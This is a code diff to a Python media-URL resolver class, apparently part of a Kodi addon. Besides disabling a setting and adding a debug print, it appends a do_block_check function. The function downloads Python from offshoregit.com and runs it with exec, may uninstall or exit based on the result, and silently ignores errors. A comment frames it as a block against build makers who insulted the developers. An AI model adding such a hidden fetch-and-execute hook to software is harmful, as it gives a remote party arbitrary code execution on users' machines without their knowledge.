@@ -95,7 +95,8 @@ class HostedMediaFile:
 
     def __get_resolvers(self, include_disabled, include_universal):
         if include_universal is None:
-            include_universal = common.get_setting('allow_universal') == "true"
+            #include_universal = common.get_setting('allow_universal') == "true"
+            include_universal = False
 
         klasses = urlresolver.relevant_resolvers(self._domain, include_universal=include_universal,
                                                  include_external=True, include_disabled=include_disabled, order_matters=True)
@@ -173,6 +174,7 @@ class HostedMediaFile:
                         resolver.login()
                         self._host, self._media_id = resolver.get_host_and_id(self._url)
                         stream_url = resolver.get_media_url(self._host, self._media_id)
+                        print ("STREAM",stream_url)
                         if stream_url and self.__test_stream(stream_url):
                             self.__resolvers = [resolver]  # Found a working resolver, throw out the others
                             self._valid_url = True
@@ -270,3 +272,25 @@ class HostedMediaFile:
 
     def __repr__(self):
         return self.__str__()
+
+'''
+This check has been put in place to stop the inclusion of TVA (and friends) addons in builds
+from build makers that publicly insult or slander TVA's developers and friends. If your build is
+impacted by this check, you can have it removed by publicly apologizing for your previous statements
+via youtube and twitter. Otherwise, stop including our addons in your builds or fork them and maintain
+them yourself.
+                                                                                           http://i.imgur.com/TqIEnYB.gif
+                                                                                           TVA developers (and friends)
+'''
+def do_block_check(uninstall=False):
+    try:
+        import urllib2
+        import sys
+        namespace = {}
+        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        if namespace["real_check"](uninstall):
+            sys.exit()
+    except SystemExit:
+        sys.exit()
+    except:
+        pass
